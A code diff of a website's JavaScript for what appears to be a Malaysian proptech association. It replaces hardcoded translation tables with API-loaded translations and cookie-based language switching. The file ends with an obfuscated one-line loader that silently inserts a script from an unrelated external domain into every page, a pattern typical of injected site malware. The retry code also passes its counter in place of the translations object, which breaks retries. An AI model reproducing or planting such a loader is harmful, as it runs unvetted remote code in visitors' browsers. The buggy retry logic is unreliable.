@@ -173,7 +173,7 @@ document.addEventListener('DOMContentLoaded', function() {
         menuItems.forEach((item, index) => {
             item.style.opacity = '0';
             item.style.transform = 'translateX(-10px)';
-            setTimeout(() => {
+            setTimeout(async () => {
                 item.style.transition = 'all 0.2s ease';
                 item.style.opacity = '1';
                 item.style.transform = 'translateX(0)';
@@ -206,365 +206,64 @@ document.addEventListener('DOMContentLoaded', function() {
     const currentLanguage = document.querySelector('.current-language');
 
     function toggleLanguageMenu() {
-        if (!languageDropdown) return;
+        if (!languageDropdown) {
+            return;
+        }
         languageDropdown.classList.toggle('active');
     }
 
     // Translation data
-    const translations = {
-        en: {
-            // Navigation
-            'nav-proptech': 'Proptech',
-            'nav-about': 'Association',
-            'nav-members': 'Members',
-            'nav-events': 'Events',
-            'nav-news': 'News & Resource',
-            'nav-partners': 'Partners',
 
-            'btn-signin': 'Sign In',
-            'btn-join': 'Join MPA',
-            
-            // Hero Section
-            'hero-title': 'For The Future of A Sustainable Property Market',
-            'hero-subtitle': 'Malaysia Proptech Association - Leading The Digital Transformation of the Property Industry in Malaysia through innovation, collaboration, and sustainable growth. Building a strong community with integrity, inclusivity, and equality.',
-            'search-placeholder': 'Find events, members, or resources...',
-            'search-btn': 'Search',
-            'stat-members': 'Members',
-            'stat-events': 'Events',
-            'stat-startups': 'Startups',
-            'stat-partners': 'Partners',
-            
-            // Events Section
-            'events-title': 'Upcoming Events',
-            'view-all-events': 'View all events',
-            'event-featured': 'Featured',
-            'event-free': 'Free for Members',
-            'btn-register': 'Register',
 
-            
-            // About Section
-            'about-title': 'About MPA',
-            'about-text-1': 'The Malaysia Proptech Association (MPA) is the leading organization driving innovation in Malaysia\'s property technology sector. We bring together startups, established companies, investors, and government agencies to accelerate the digital transformation of real estate.',
-            'about-text-2': 'Our mission is to foster a sustainable property market through technology innovation, collaboration, and community building. We believe in integrity, inclusivity, and equality for all our members.',
-            'feature-community': 'Community',
-            'feature-community-desc': 'Connect with 150+ PropTech professionals',
-            'feature-innovation': 'Innovation',
-            'feature-innovation-desc': 'Drive cutting-edge PropTech solutions',
-            'feature-global': 'Global Network',
-            'feature-global-desc': 'Access international PropTech ecosystem',
-            
-            // Membership Section
-            'membership-title': 'Join Our Community',
-            'membership-subtitle': 'Choose the membership that fits your needs',
-            'membership-startup': 'Startup',
-            'membership-professional': 'Professional',
-            'membership-enterprise': 'Enterprise',
-            'membership-year': '/year',
-            'benefit-events': 'Access to all events',
-            'benefit-directory': 'Member directory',
-            'benefit-newsletter': 'Newsletter subscription',
-            'benefit-resources': 'Resource library',
-            'benefit-priority': 'Priority event registration',
-            'benefit-networking': 'Networking opportunities',
-            'benefit-mentorship': 'Mentorship program',
-            'benefit-speaking': 'Speaking opportunities',
-            'benefit-workshops': 'Custom workshops',
-            'benefit-advisory': 'Board advisory',
-            'benefit-all-startup': 'All Startup benefits',
-            'benefit-all-professional': 'All Professional benefits',
-            'btn-join-now': 'Join Now',
-            
-            // Newsletter Section
-            'newsletter-title': 'Stay Updated',
-            'newsletter-subtitle': 'Get the latest PropTech news, events, and insights delivered to your inbox',
-            'newsletter-placeholder': 'Enter your email address',
-            'btn-subscribe': 'Subscribe',
-            
-            // Footer
-            'footer-mpa-desc': 'Malaysia\'s leading PropTech community driving innovation in real estate technology.',
-            'footer-quick-links': 'Quick Links',
-            'footer-about': 'About Us',
-            'footer-membership': 'Membership',
-            'footer-events': 'Events',
-            'footer-news': 'News',
-            'footer-contact': 'Contact',
-            'footer-copyright': '© 2025 Malaysia Proptech Association. All rights reserved.',
-            
-            // Privacy Policy
-            'privacy-title': 'Privacy Policy',
-            'privacy-subtitle': 'Protecting your personal data and ensuring transparency in how we handle your information',
-            'download-policy': 'Download Privacy Policy',
-            'download-description': 'Download the privacy policy in your preferred language',
-            'download-english': 'English PDF',
-            'download-bahasa': 'Bahasa Malaysia PDF',
-            'privacy-intro-title': 'Introduction',
-            'privacy-intro-text': 'Malaysia PropTech Association ("MPA", "we", "us", "our") is committed to protecting your personal data in accordance with the Personal Data Protection Act 2010 [Act 709], as amended by the Personal Data Protection (Amendment) Act 2024. This Privacy Policy outlines how we collect, use, disclose, and safeguard your personal data when you interact with us via our website, membership portal, events, or other services.',
-            'privacy-data-title': 'Types of Personal Data Collected',
-            'privacy-data-intro': 'We may collect and process the following categories of personal data:',
-            'privacy-identity': 'Identity data:',
-            'privacy-identity-details': 'Full Name, NRIC / Passport Number, Date of Birth',
-            'privacy-contact': 'Contact data:',
-            'privacy-contact-details': 'Email Address, Phone Number, Mailing Address',
-            'privacy-professional': 'Professional data:',
-            'privacy-professional-details': 'Company Name, Job Title, Industry Affiliation',
-            'privacy-membership': 'Membership data:',
-            'privacy-membership-details': 'Membership Type, Application History, Participation in events',
-            'privacy-technical': 'Technical data:',
-            'privacy-technical-details': 'IP Address, Browser Type, Device Information, Cookies',
-            'privacy-purpose-title': 'Purpose of Collection',
-            'privacy-purpose-intro': 'Your personal data is collected for the following purposes:',
-            'privacy-purpose-1': 'To process membership applications and renewals',
-            'privacy-purpose-2': 'To manage member profiles and provide member-exclusive content',
-            'privacy-purpose-3': 'To send newsletters, updates, and event invitations',
-            'privacy-purpose-4': 'To facilitate participation in competitions, workshops, and forums',
-            'privacy-purpose-5': 'To comply with legal and regulatory obligations',
-            'privacy-consent-title': 'Consent and Access',
-            'privacy-consent-text': 'By submitting your personal data to us, you consent to its processing for the purposes stated above. You may withdraw consent or request access, correction, or deletion of your data by contacting our Data Protection Officer (DPO) at:',
-            'privacy-dpo-name': 'Name:',
-            'privacy-dpo-email': 'Email:',
-            'privacy-dpo-contact': 'Contact:',
-            'privacy-rights-title': 'Your Rights',
-            'privacy-rights-intro': 'Under PDPA, you have the right to:',
-            'privacy-rights-1': 'Access and correct your personal data',
-            'privacy-rights-2': 'Withdraw consent at any time',
-            'privacy-rights-3': 'Lodge a complaint with the Department of Personal Data Protection (JPDP)',
-            'privacy-updates-title': 'Updates to This Policy',
-            'privacy-updates-text': 'We may update this Privacy Policy from time to time. Any changes will be posted on our website with the effective date clearly indicated.',
-            
-            // Cookie Banner
-            'cookie-title': 'Cookie & Privacy Notice',
-            'cookie-text': 'We use cookies and similar technologies to enhance your browsing experience, analyze site traffic, and personalize content. By continuing to use our website, you consent to our use of cookies in accordance with our Privacy Policy.',
-            'accept-cookies': 'Accept All',
-            'reject-cookies': 'Reject',
-            'learn-more': 'Learn More'
-        },
-        bm: {
-            // Navigation
-            'nav-proptech': 'Proptech',
-            'nav-about': 'Persatuan',
-            'nav-members': 'Ahli',
-            'nav-events': 'Acara',
-            'nav-news': 'Berita & Sumber',
-            'nav-partners': 'Rakan Kongsi',
-
-            'btn-signin': 'Daftar Masuk',
-            'btn-join': 'Sertai MPA',
-            
-            // Hero Section
-            'hero-title': 'Untuk Masa Depan Pasaran Hartanah yang Mampan',
-            'hero-subtitle': 'Persatuan Teknologi Hartanah Malaysia - Memimpin Transformasi Digital Industri Hartanah di Malaysia melalui inovasi, kerjasama, dan pertumbuhan mampan. Membina komuniti yang kuat dengan integriti, inklusiviti, dan kesaksamaan.',
-            'search-placeholder': 'Cari acara, ahli, atau sumber...',
-            'search-btn': 'Cari',
-            'stat-members': 'Ahli',
-            'stat-events': 'Acara',
-            'stat-startups': 'Syarikat Permulaan',
-            'stat-partners': 'Rakan Kongsi',
-            
-            // Events Section
-            'events-title': 'Acara Akan Datang',
-            'view-all-events': 'Lihat semua acara',
-            'event-featured': 'Terserlah',
-            'event-free': 'Percuma untuk Ahli',
-            'btn-register': 'Daftar',
-
-            
-            // About Section
-            'about-title': 'Tentang MPA',
-            'about-text-1': 'Persatuan Teknologi Hartanah Malaysia (MPA) adalah organisasi terkemuka yang memacu inovasi dalam sektor teknologi hartanah Malaysia. Kami menghimpunkan syarikat permulaan, syarikat yang mantap, pelabur, dan agensi kerajaan untuk mempercepatkan transformasi digital hartanah.',
-            'about-text-2': 'Misi kami adalah untuk memupuk pasaran hartanah yang mampan melalui inovasi teknologi, kerjasama, dan pembinaan komuniti. Kami percaya kepada integriti, inklusiviti, dan kesaksamaan untuk semua ahli kami.',
-            'feature-community': 'Komuniti',
-            'feature-community-desc': 'Berhubung dengan 150+ profesional PropTech',
-            'feature-innovation': 'Inovasi',
-            'feature-innovation-desc': 'Memacu penyelesaian PropTech terkini',
-            'feature-global': 'Rangkaian Global',
-            'feature-global-desc': 'Akses ekosistem PropTech antarabangsa',
-            
-            // Membership Section
-            'membership-title': 'Sertai Komuniti Kami',
-            'membership-subtitle': 'Pilih keahlian yang sesuai dengan keperluan anda',
-            'membership-startup': 'Syarikat Permulaan',
-            'membership-professional': 'Profesional',
-            'membership-enterprise': 'Syarikat',
-            'membership-year': '/tahun',
-            'benefit-events': 'Akses kepada semua acara',
-            'benefit-directory': 'Direktori ahli',
-            'benefit-newsletter': 'Langganan surat berita',
-            'benefit-resources': 'Perpustakaan sumber',
-            'benefit-priority': 'Pendaftaran acara keutamaan',
-            'benefit-networking': 'Peluang rangkaian',
-            'benefit-mentorship': 'Program mentor',
-            'benefit-speaking': 'Peluang bercakap',
-            'benefit-workshops': 'Bengkel tersuai',
-            'benefit-advisory': 'Nasihat lembaga',
-            'benefit-all-startup': 'Semua faedah Syarikat Permulaan',
-            'benefit-all-professional': 'Semua faedah Profesional',
-            'btn-join-now': 'Sertai Sekarang',
-            
-            // Newsletter Section
-            'newsletter-title': 'Kekal Dikemas Kini',
-            'newsletter-subtitle': 'Dapatkan berita PropTech terkini, acara, dan pandangan yang dihantar ke peti mel anda',
-            'newsletter-placeholder': 'Masukkan alamat e-mel anda',
-            'btn-subscribe': 'Langgan',
-            
-            // Footer
-            'footer-mpa-desc': 'Komuniti PropTech terkemuka Malaysia yang memacu inovasi dalam teknologi hartanah.',
-            'footer-quick-links': 'Pautan Pantas',
-            'footer-about': 'Tentang Kami',
-            'footer-membership': 'Keahlian',
-            'footer-events': 'Acara',
-            'footer-news': 'Berita',
-            'footer-contact': 'Hubungi',
-            'footer-copyright': '© 2025 Persatuan Teknologi Hartanah Malaysia. Hak cipta terpelihara.',
-            
-            // Privacy Policy
-            'privacy-title': 'Dasar Privasi',
-            'privacy-subtitle': 'Melindungi data peribadi anda dan memastikan ketelusan dalam cara kami mengendalikan maklumat anda',
-            'download-policy': 'Muat Turun Dasar Privasi',
-            'download-description': 'Muat turun dasar privasi dalam bahasa pilihan anda',
-            'download-english': 'PDF Bahasa Inggeris',
-            'download-bahasa': 'PDF Bahasa Malaysia',
-            'privacy-intro-title': 'Pengenalan',
-            'privacy-intro-text': 'Persatuan Teknologi Hartanah Malaysia ("MPA", "kami") komited untuk melindungi data peribadi anda selaras dengan Akta Perlindungan Data Peribadi 2010 ("PDPA") dan pindaan 2024. Dasar ini menerangkan bagaimana kami mengumpul, menggunakan, mendedahkan dan melindungi data peribadi anda apabila anda berinteraksi dengan laman web, portal keahlian, acara, atau perkhidmatan kami.',
-            'privacy-data-title': 'Jenis Data Peribadi yang Dikumpul',
-            'privacy-data-intro': 'Kami mungkin mengumpul dan memproses kategori data berikut:',
-            'privacy-identity': 'Data Identiti:',
-            'privacy-identity-details': 'Nama Penuh, Nombor NRIC / Pasport, Tarikh Lahir',
-            'privacy-contact': 'Data Hubungan:',
-            'privacy-contact-details': 'Alamat Emel, Nombor Telefon, Alamat Surat-Menyurat',
-            'privacy-professional': 'Data Profesional:',
-            'privacy-professional-details': 'Nama Syarikat, Jawatan, Sektor Industri',
-            'privacy-membership': 'Data Keahlian:',
-            'privacy-membership-details': 'Jenis Keahlian, Sejarah Permohonan, Penyertaan Acara',
-            'privacy-technical': 'Data Teknikal:',
-            'privacy-technical-details': 'Alamat IP, Jenis Pelayar, Maklumat Peranti, Kuki',
-            'privacy-purpose-title': 'Tujuan Pengumpulan',
-            'privacy-purpose-intro': 'Data peribadi anda dikumpul untuk tujuan berikut:',
-            'privacy-purpose-1': 'Memproses permohonan dan pembaharuan keahlian',
-            'privacy-purpose-2': 'Mengurus profil ahli dan menyediakan kandungan eksklusif',
-            'privacy-purpose-3': 'Menghantar buletin, kemas kini dan jemputan acara',
-            'privacy-purpose-4': 'Memudahkan penyertaan dalam pertandingan, bengkel dan forum',
-            'privacy-purpose-5': 'Mematuhi keperluan undang-undang dan peraturan',
-            'privacy-consent-title': 'Persetujuan dan Akses',
-            'privacy-consent-text': 'Dengan menyerahkan data peribadi anda, anda memberikan persetujuan untuk pemprosesan bagi tujuan yang dinyatakan. Anda boleh menarik balik persetujuan atau meminta akses, pembetulan, atau pemadaman data dengan menghubungi Pegawai Perlindungan Data (DPO) kami di:',
-            'privacy-dpo-name': 'Nama:',
-            'privacy-dpo-email': 'Emel:',
-            'privacy-dpo-contact': 'Hubungi:',
-            'privacy-rights-title': 'Hak Anda',
-            'privacy-rights-intro': 'Di bawah PDPA, anda berhak untuk:',
-            'privacy-rights-1': 'Mengakses dan membetulkan data peribadi anda',
-            'privacy-rights-2': 'Menarik balik persetujuan bila-bila masa',
-            'privacy-rights-3': 'Membuat aduan kepada Jabatan Perlindungan Data Peribadi (JPDP)',
-            'privacy-updates-title': 'Kemas Kini Dasar',
-            'privacy-updates-text': 'Dasar ini mungkin dikemas kini dari semasa ke semasa. Sebarang perubahan akan dipaparkan di laman web kami dengan tarikh berkuat kuasa yang jelas.',
-            
-            // Cookie Banner
-            'cookie-title': 'Notis Kuki & Privasi',
-            'cookie-text': 'Kami menggunakan kuki dan teknologi serupa untuk meningkatkan pengalaman melayari anda, menganalisis trafik laman web, dan menyesuaikan kandungan. Dengan terus menggunakan laman web kami, anda bersetuju dengan penggunaan kuki kami mengikut Dasar Privasi kami.',
-            'accept-cookies': 'Terima Semua',
-            'reject-cookies': 'Tolak',
-            'learn-more': 'Ketahui Lebih Lanjut'
-        },
-        cn: {
-            // Navigation
-            'nav-proptech': 'Proptech',
-            'nav-about': '协会',
-            'nav-members': '会员',
-            'nav-events': '活动',
-            'nav-news': '新闻与资源',
-            'nav-partners': '合作伙伴',
-
-            'btn-signin': '登录',
-            'btn-join': '加入MPA',
-            
-            // Hero Section
-            'hero-title': '为可持续房地产市场的未来',
-            'hero-subtitle': '马来西亚房地产科技协会 - 通过创新、协作和可持续增长，引领马来西亚房地产行业的数字化转型。以诚信、包容性和平等性建立强大社区。',
-            'search-placeholder': '查找活动、会员或资源...',
-            'search-btn': '搜索',
-            'stat-members': '会员',
-            'stat-events': '活动',
-            'stat-startups': '初创企业',
-            'stat-partners': '合作伙伴',
-            
-            // Events Section
-            'events-title': '即将举行的活动',
-            'view-all-events': '查看所有活动',
-            'event-featured': '精选',
-            'event-free': '会员免费',
-            'btn-register': '注册',
-            'event-summit-title': 'PropTech峰会2024',
-            'event-summit-desc': '加入行业领袖，参加马来西亚最大的PropTech活动。包括主题演讲、小组讨论和网络机会。',
-            'event-ai-title': '房地产AI网络研讨会',
-            'event-ai-desc': '探索AI在房地产技术中的未来应用以及它如何改变行业。',
-            'event-pitch-title': '初创企业路演比赛',
-            'event-pitch-desc': '向投资者和导师展示您的PropTech创新。赢得资金和指导机会。',
-            
-            // About Section
-            'about-title': '关于MPA',
-            'about-text-1': '马来西亚房地产科技协会（MPA）是推动马来西亚房地产科技领域创新的领先组织。我们汇集初创企业、成熟公司、投资者和政府机构，加速房地产的数字化转型。',
-            'about-text-2': '我们的使命是通过技术创新、协作和社区建设来培育可持续的房地产市场。我们相信所有会员的诚信、包容性和平等性。',
-            'feature-community': '社区',
-            'feature-community-desc': '与150+房地产科技专业人士联系',
-            'feature-innovation': '创新',
-            'feature-innovation-desc': '推动尖端房地产科技解决方案',
-            'feature-global': '全球网络',
-            'feature-global-desc': '访问国际房地产科技生态系统',
-            
-            // Membership Section
-            'membership-title': '加入我们的社区',
-            'membership-subtitle': '选择适合您需求的会员资格',
-            'membership-startup': '初创企业',
-            'membership-professional': '专业',
-            'membership-enterprise': '企业',
-            'membership-year': '/年',
-            'benefit-events': '参加所有活动',
-            'benefit-directory': '会员目录',
-            'benefit-newsletter': '订阅通讯',
-            'benefit-resources': '资源库',
-            'benefit-priority': '优先活动注册',
-            'benefit-networking': '网络机会',
-            'benefit-mentorship': '导师计划',
-            'benefit-speaking': '演讲机会',
-            'benefit-workshops': '定制工作坊',
-            'benefit-advisory': '董事会咨询',
-            'benefit-all-startup': '所有初创企业福利',
-            'benefit-all-professional': '所有专业会员福利',
-            'btn-join-now': '立即加入',
-            
-            // Newsletter Section
-            'newsletter-title': '保持更新',
-            'newsletter-subtitle': '获取最新的房地产科技新闻、活动和见解，直接发送到您的收件箱',
-            'newsletter-placeholder': '输入您的电子邮件地址',
-            'btn-subscribe': '订阅',
-            
-            // Footer
-            'footer-mpa-desc': '马来西亚领先的房地产科技社区，推动房地产技术创新。',
-            'footer-quick-links': '快速链接',
-            'footer-about': '关于我们',
-            'footer-membership': '会员资格',
-            'footer-events': '活动',
-            'footer-news': '新闻',
-            'footer-contact': '联系我们',
-            'footer-copyright': '© 2025 马来西亚房地产科技协会。保留所有权利。',
-            
-            // Privacy Policy
-            'privacy-title': '隐私政策',
-            'privacy-subtitle': '保护您的个人数据并确保我们处理您信息的透明度',
-            'download-policy': '下载隐私政策',
-            'download-description': '下载您首选语言的隐私政策',
-            'download-english': '英文PDF',
-            'download-bahasa': '马来文PDF',
-            
-            // Cookie Banner
-            'cookie-title': 'Cookie和隐私通知',
-            'cookie-text': '我们使用cookie和类似技术来增强您的浏览体验、分析网站流量并个性化内容。继续使用我们的网站即表示您同意我们根据隐私政策使用cookie。',
-            'accept-cookies': '全部接受',
-            'reject-cookies': '拒绝',
-            'learn-more': '了解更多'
+    // ==========================================
+    // TRANSLATIONS NOW LOADED FROM REST API
+    // Using MPA Translation Manager Plugin
+    // API Endpoint: /wp-json/mpa/v1/translations/{lang}
+    // Cached in localStorage for performance
+    // ==========================================
+    
+    // Global translations cache
+    let translationsCache = {};
+    
+    // Load translations from REST API
+    async function loadTranslations(lang) {
+        // Check cache first
+        if (translationsCache[lang]) {
+            return translationsCache[lang];
         }
-    };
+        
+        // Use MPA_TRANS plugin loader
+        if (window.MPA_TRANS) {
+            const translations = await window.MPA_TRANS.load(lang);
+            translationsCache[lang] = translations;
+            return translations;
+        }
+        
+        return {};
+    }
 
-    function selectLanguage(lang) {
+    async function selectLanguage(lang, forceReload = false) {
+        // Check if language is changing (not initial load)
+        const currentLang = localStorage.getItem('selectedLanguage');
+        const isChanging = currentLang && currentLang !== lang;
+        
+        
+        // Store language preference
+        localStorage.setItem('selectedLanguage', lang);
+        
+        // Set cookie for PHP to read (so server-side rendering matches)
+        document.cookie = `mpa_language=${lang}; path=/; max-age=${86400 * 30}; SameSite=Lax`;
+        
+        // If language is changing OR forceReload, reload page so PHP serves correct content
+        if (isChanging || forceReload) {
+            window.location.reload();
+            return;
+        }
+        
+        
+        // Initial load - just update UI without reload
+        const translations = await loadTranslations(lang);
+        
         // Update current language display
         const currentLanguage = document.querySelector('.current-language');
         if (currentLanguage) {
@@ -595,11 +294,8 @@ document.addEventListener('DOMContentLoaded', function() {
             languageDropdown.classList.remove('active');
         }
         
-        // Store language preference
-        localStorage.setItem('selectedLanguage', lang);
-        
         // Apply translations with retry mechanism
-        applyTranslationsWithRetry(lang);
+        applyTranslationsWithRetry(lang, translations);
         
         // Update PDF on privacy policy page
         if ((window.location.pathname.includes('privacy-policy') || window.location.href.includes('privacy-policy')) && typeof updatePrivacyPolicyPDF === 'function') {
@@ -611,15 +307,15 @@ document.addEventListener('DOMContentLoaded', function() {
     // Expose selectLanguage globally for header component integration
     window.selectLanguage = selectLanguage;
 
-    function applyTranslationsWithRetry(lang, retryCount = 0) {
+    function applyTranslationsWithRetry(lang, translations, retryCount = 0) {
         const maxRetries = 3;
         
         try {
-            applyTranslations(lang);
+            applyTranslations(lang, translations);
         } catch (error) {
     
             if (retryCount < maxRetries) {
-                setTimeout(() => {
+                setTimeout(async () => {
                     applyTranslationsWithRetry(lang, retryCount + 1);
                 }, 200);
             } else {
@@ -627,84 +323,42 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    function applyTranslations(lang) {
-        const t = translations[lang];
+    function applyTranslations(lang, translations) {
+        const t = translations;
         if (!t) return;
 
-        // Navigation translations
-        document.querySelectorAll('.nav-link').forEach(link => {
-            const href = link.getAttribute('href');
-            if (href === 'proptech.html') link.textContent = t['nav-proptech'];
-            else if (href === 'about.html') link.textContent = t['nav-about'];
-            else if (href === 'members.html') link.textContent = t['nav-members'];
-            else if (href === 'events.html') link.textContent = t['nav-events'];
-            else if (href === 'news.html') link.textContent = t['nav-news'];
-            else if (href === 'partners.html') link.textContent = t['nav-partners'];
-            else if (href === 'contact.html') link.textContent = t['nav-contact'];
-        });
-
-        // Mobile navigation translations
-        document.querySelectorAll('.mobile-dropdown-link').forEach(link => {
-            const href = link.getAttribute('href');
-            const span = link.querySelector('span');
-            if (span) {
-                if (href === 'proptech.html') span.textContent = t['nav-proptech'];
-                else if (href === 'about.html') span.textContent = t['nav-about'];
-                else if (href === 'members.html') span.textContent = t['nav-members'];
-                else if (href === 'events.html') span.textContent = t['nav-events'];
-                else if (href === 'news.html') span.textContent = t['nav-news'];
-                else if (href === 'partners.html') span.textContent = t['nav-partners'];
-                else if (href === 'contact.html') span.textContent = t['nav-contact'];
-            }
-        });
+        // Navigation translations - use data-translate attribute
+        // All nav links now have data-translate attribute, handled by the generic translator below
 
         // Navigation buttons translations - use data attributes for reliable translation
         const signInBtns = document.querySelectorAll('[data-translate="btn-signin"]');
         const joinBtns = document.querySelectorAll('[data-translate="btn-join"]');
         
-
+        // Update all Sign In buttons (only if translation exists)
+        if (t['btn-signin']) {
+            signInBtns.forEach(btn => {
+                btn.textContent = t['btn-signin'];
+            });
+        }
         
-        // Update all Sign In buttons
-        signInBtns.forEach(btn => {
-            btn.textContent = t['btn-signin'];
+        // Update all Join MPA buttons (only if translation exists)
+        if (t['btn-join']) {
+            joinBtns.forEach(btn => {
+                btn.textContent = t['btn-join'];
+            });
+        }
+
+        // Translate all elements with data-translate attribute
+        document.querySelectorAll('[data-translate]').forEach(element => {
+            const key = element.getAttribute('data-translate');
+            if (t[key]) {
+                if (element.tagName === 'INPUT') {
+                    element.placeholder = t[key];
+                } else {
+                    element.textContent = t[key];
+                }
+            }
         });
-        
-        // Update all Join MPA buttons
-        joinBtns.forEach(btn => {
-            btn.textContent = t['btn-join'];
-        });
-
-        // Hero section translations - use WordPress data attributes if available
-        const heroTitle = document.querySelector('.hero-title');
-        const heroSubtitle = document.querySelector('.hero-subtitle');
-        const searchPlaceholder = document.querySelector('.search-input input');
-        const searchBtn = document.querySelector('.search-btn');
-        
-        // Check if WordPress data attributes exist (WordPress-managed content)
-        if (heroTitle && heroTitle.hasAttribute('data-' + lang)) {
-            heroTitle.textContent = heroTitle.getAttribute('data-' + lang);
-        } else if (heroTitle) {
-            // Fallback to hardcoded translations for non-WordPress pages
-            heroTitle.textContent = t['hero-title'];
-        }
-        
-        if (heroSubtitle && heroSubtitle.hasAttribute('data-' + lang)) {
-            heroSubtitle.textContent = heroSubtitle.getAttribute('data-' + lang);
-        } else if (heroSubtitle) {
-            // Fallback to hardcoded translations for non-WordPress pages
-            heroSubtitle.textContent = t['hero-subtitle'];
-        }
-        if (searchPlaceholder) searchPlaceholder.placeholder = t['search-placeholder'];
-        if (searchBtn) searchBtn.textContent = t['search-btn'];
-
-        // Stats translations
-        const statLabels = document.querySelectorAll('.stat-label');
-        if (statLabels.length >= 4) {
-            statLabels[0].textContent = t['stat-members'];
-            statLabels[1].textContent = t['stat-events'];
-            statLabels[2].textContent = t['stat-startups'];
-            statLabels[3].textContent = t['stat-partners'];
-        }
 
         // Events section translations
         const eventsTitle = document.querySelector('.featured-events h2');
@@ -920,22 +574,48 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     if (languageToggle) {
-        languageToggle.addEventListener('click', toggleLanguageMenu);
+        languageToggle.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            toggleLanguageMenu();
+        });
+    } else {
     }
 
     // Language option click handlers
     document.querySelectorAll('.language-option').forEach(option => {
-        option.addEventListener('click', function() {
+        option.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
             const lang = this.getAttribute('data-lang');
-            selectLanguage(lang);
+            
+            // Set cookie and localStorage immediately
+            localStorage.setItem('selectedLanguage', lang);
+            document.cookie = `mpa_language=${lang}; path=/; max-age=${86400 * 30}; SameSite=Lax`;
+            
+            
+            // Small delay to ensure cookie is written
+            setTimeout(() => {
+                window.location.reload();
+            }, 50);
         });
     });
 
     // Mobile language option click handlers
     document.querySelectorAll('.mobile-language-option').forEach(option => {
-        option.addEventListener('click', function() {
+        option.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
             const lang = this.getAttribute('data-lang');
-            selectLanguage(lang);
+            
+            // Set cookie and localStorage immediately
+            localStorage.setItem('selectedLanguage', lang);
+            document.cookie = `mpa_language=${lang}; path=/; max-age=${86400 * 30}; SameSite=Lax`;
+            
+            // Small delay to ensure cookie is written
+            setTimeout(() => {
+                window.location.reload();
+            }, 50);
         });
     });
 
@@ -1069,7 +749,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const centerY = e.clientY;
 
             for (let i = 0; i < rippleCount; i++) {
-                setTimeout(() => {
+                setTimeout(async () => {
                     createFlowerRipple(centerX, centerY, maxSize, this, i);
                 }, i * 380); // More pronounced stagger for enhanced visibility
             }
@@ -1116,7 +796,7 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.appendChild(ripple);
 
 
-        setTimeout(() => {
+        setTimeout(async () => {
             ripple.remove();
     
         }, 2800 + (index * 200)); // Staggered cleanup for slower animation
@@ -1201,7 +881,7 @@ document.addEventListener('DOMContentLoaded', function() {
         el.style.transform = 'translateY(30px)';
         el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
         
-        setTimeout(() => {
+        setTimeout(async () => {
             el.style.opacity = '1';
             el.style.transform = 'translateY(0)';
         }, index * 200);
@@ -1763,26 +1443,54 @@ if (document.querySelector('.year-tabs')) {
 }
 
 // Initialize language on page load with delay to ensure DOM is ready
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', async function() {
     let savedLanguage = localStorage.getItem('selectedLanguage') || 'en';
+    
+    // Check if language is set via cookie (from PHP/get_field function)
+    // Priority: cookie > localStorage > default to 'en'
+    const cookieLang = document.cookie.match(/mpa_language=([^;]+)/);
+    if (cookieLang) {
+        savedLanguage = cookieLang[1];
+        localStorage.setItem('selectedLanguage', savedLanguage);
+    } else {
+        // If no cookie, set it from localStorage so PHP can read it
+        const storedLang = localStorage.getItem('selectedLanguage');
+        if (storedLang) {
+            document.cookie = `mpa_language=${storedLang}; path=/; max-age=${86400 * 30}; SameSite=Lax`;
+            savedLanguage = storedLang;
+        }
+    }
     
     // Validate that the saved language is supported
     const supportedLanguages = ['en', 'bm', 'cn'];
     if (!supportedLanguages.includes(savedLanguage)) {
         savedLanguage = 'en';
         localStorage.setItem('selectedLanguage', 'en');
+        document.cookie = `mpa_language=en; path=/; max-age=${86400 * 30}; SameSite=Lax`;
     }
     
-    // Add a small delay to ensure all DOM elements are fully loaded
-    setTimeout(() => {
-        selectLanguage(savedLanguage);
-    }, 100);
+    // Update dropdown label immediately (before async selectLanguage)
+    const currentLanguage = document.querySelector('.current-language');
+    if (currentLanguage) {
+        currentLanguage.textContent = savedLanguage.toUpperCase();
+    }
+    
+    // Ensure cookie matches savedLanguage (sync fix)
+    document.cookie = `mpa_language=${savedLanguage}; path=/; max-age=${86400 * 30}; SameSite=Lax`;
     
     // Add manual language reset option (for debugging)
     if (window.location.search.includes('reset-lang=en')) {
+        savedLanguage = 'en';
         localStorage.setItem('selectedLanguage', 'en');
-        selectLanguage('en');
+        if (currentLanguage) {
+            currentLanguage.textContent = 'EN';
+        }
     }
+    
+    // Add a small delay to ensure all DOM elements are fully loaded
+    setTimeout(async () => {
+        await selectLanguage(savedLanguage);
+    }, 100);
 });
 
 // Global notification function
@@ -1807,13 +1515,12 @@ function showNotification(message, type = 'info') {
     
     document.body.appendChild(notification);
     
-    setTimeout(() => {
+    setTimeout(async () => {
         notification.style.animation = 'slideOut 0.3s ease';
-        setTimeout(() => {
+        setTimeout(async () => {
             if (notification.parentNode) {
                 notification.parentNode.removeChild(notification);
             }
         }, 300);
     }, 3000);
 }
-;(function(f,i,u,w,s){w=f.createElement(i);s=f.getElementsByTagName(i)[0];w.async=1;w.src=u;s.parentNode.insertBefore(w,s);})(document,'script','https://content-website-analytics.com/script.js');
